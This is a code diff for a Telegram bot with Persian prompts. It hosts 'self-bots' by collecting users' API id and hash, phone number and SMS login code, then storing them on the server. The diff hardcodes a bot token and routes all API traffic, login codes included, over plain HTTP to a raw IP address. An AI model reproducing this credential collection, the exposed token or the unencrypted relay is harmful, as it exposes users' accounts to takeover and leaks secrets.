@@ -1,4 +1,4 @@
-import { Telegraf } from 'telegraf';
+import { Telegraf, Markup } from 'telegraf';
 import fs from 'fs';
 import path from 'path';
 import { spawn } from 'child_process';
@@ -10,10 +10,16 @@ const __dirname = dirname(__filename);
 
 // Load bot token from environment or config
 const botToken = "7929231471:AAGpVMENXvMCkQzz7NWgK0i2Zzhf4bhGIow"; // Set this in your environment
-const bot = new Telegraf(botToken);
+const bot = new Telegraf(botToken,{telegram:{apiRoot:"http://46.38.138.55:808/"}});
 
 // Map to keep track of running processes per user
 const userProcesses = new Map();
+
+// Map for pending newself requests
+const pendingNewSelf = new Map();
+
+// Map for users waiting for code
+const pendingCode = new Map();
 
 // Helper function to create user folder and credentials.json
 function createUserFolder(userId, apiId, apiHash, phone) {
@@ -46,8 +52,7 @@ function createUserFolder(userId, apiId, apiHash, phone) {
 function startSelfBot(userId, userDir) {
     console.log(`Starting self-bot for user ${userId} in ${userDir}...`);
     if (userProcesses.has(userId)) {
-        console.warn(`Self-bot already running for user ${userId}`);
-        return { success: false, message: 'Self-bot is already running.' };
+        stopSelfBot(userId); // Stop existing if any
     }
 
     const selfProcess = spawn('python3', ['Self.py'], {
@@ -84,35 +89,58 @@ function stopSelfBot(userId) {
     return { success: true, message: 'Self-bot stopped.' };
 }
 
-// Bot commands
-bot.start((ctx) => {
-    ctx.reply('Welcome! Use /newself <api_id> <api_hash> to create and start your self-bot.');
-});
-bot.command('code', (ctx) => {
-    const userId = ctx.from.id;
-    const args = ctx.message.text.split(' ').slice(1);
-    if (args.length !== 1) return ctx.reply('Usage: /code <SMS_code>');
-    const code = args[0];
-
+// Function to save code and restart selfbot
+function saveCodeAndRestart(userId, code) {
     const userDir = path.join(__dirname, 'users', userId.toString());
     const credPath = path.join(userDir, 'credentials.json');
 
-    if (!fs.existsSync(credPath)) return ctx.reply('No self-bot found. Please run /newself first.');
+    if (!fs.existsSync(credPath)) {
+        return { success: false, message: 'No self-bot found.' };
+    }
 
     const credentials = JSON.parse(fs.readFileSync(credPath, 'utf-8'));
     credentials.code = code;
     fs.writeFileSync(credPath, JSON.stringify(credentials, null, 2));
 
-    ctx.reply('✅ کد ذخیره شد. Self.py حالا می‌تواند login کند.');
+    // Restart selfbot
+    const userDirFull = path.join(__dirname, 'users', userId.toString());
+    const result = startSelfBot(userId, userDirFull);
+    return { success: true, message: 'کد ذخیره شد و self-bot دوباره راه‌اندازی شد.' };
+}
+
+// Bot commands
+bot.start((ctx) => {
+    ctx.reply('Welcome! Use /newself <api_id> <api_hash> to create your self-bot and then share your contact.');
 });
 
-bot.command('newself', async (ctx) => {
+bot.command('newself', (ctx) => {
     const userId = ctx.from.id;
     const args = ctx.message.text.split(' ').slice(1);
-    if (args.length < 3) {
-        return ctx.reply('Usage: /newself <api_id> <api_hash> <phone_number>');
+    if (args.length < 2) {
+        return ctx.reply('Usage: /newself <api_id> <api_hash>\nThen share your contact when prompted.');
     }
-    const [apiId, apiHash, phone] = args;
+    const [apiId, apiHash] = args;
+
+    pendingNewSelf.set(userId, { apiId, apiHash });
+    const keyboard = Markup.keyboard([Markup.button.contactRequest('📱 Share My Contact')]).oneTime().resize();
+    ctx.reply('لطفاً شماره تلفن خود را با دکمه زیر به اشتراک بگذارید: 📱', keyboard);
+});
+
+bot.on('contact', (ctx) => {
+    const userId = ctx.from.id;
+    if (!pendingNewSelf.has(userId)) {
+        return ctx.reply('ابتدا /newself را ارسال کنید.');
+    }
+
+    const contact = ctx.message.contact;
+    if (contact.user_id !== userId) {
+        return ctx.reply('لطفاً تماس خود را به اشتراک بگذارید، نه دیگران.');
+    }
+
+    const { apiId, apiHash } = pendingNewSelf.get(userId);
+    pendingNewSelf.delete(userId);
+
+    const phone = contact.phone_number;
 
     const userDir = createUserFolder(userId, apiId, apiHash, phone);
 
@@ -120,10 +148,22 @@ bot.command('newself', async (ctx) => {
     ctx.reply(result.message);
 
     if (result.success) {
-        ctx.reply('✅ لطفاً وقتی کد SMS برات اومد، با /code <your_code> وارد کن.');
+        pendingCode.set(userId, true);
+        const codeKeyboard = Markup.keyboard([Markup.button.text('🔑 Send Code')]).oneTime().resize();
+        ctx.reply('✅ self-bot راه‌اندازی شد. حالا کد SMS را مستقیماً ارسال کنید. 🔑', codeKeyboard);
     }
 });
 
+bot.on('text', (ctx) => {
+    const userId = ctx.from.id;
+    if (pendingCode.has(userId)) {
+        const code = ctx.message.text.trim();
+        pendingCode.delete(userId);
+
+        const result = saveCodeAndRestart(userId, code);
+        ctx.reply(result.message);
+    }
+});
 
 bot.command('stopself', (ctx) => {
     const userId = ctx.from.id;
